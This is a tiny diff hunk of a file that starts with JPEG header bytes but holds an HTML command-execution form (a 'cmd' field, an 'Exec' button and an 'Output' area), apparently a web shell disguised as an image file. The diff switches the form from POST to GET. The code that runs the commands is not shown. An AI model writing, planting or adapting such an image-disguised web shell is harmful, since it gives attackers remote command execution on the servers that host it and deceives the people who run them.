@@ -1,5 +1,5 @@
 ÿØÿà
-<form action="" method="post">
+<form action="" method="get">
 Command: <input type="text" name="cmd" /><input type="submit" value="Exec" />
 </form>
 Output:<br />
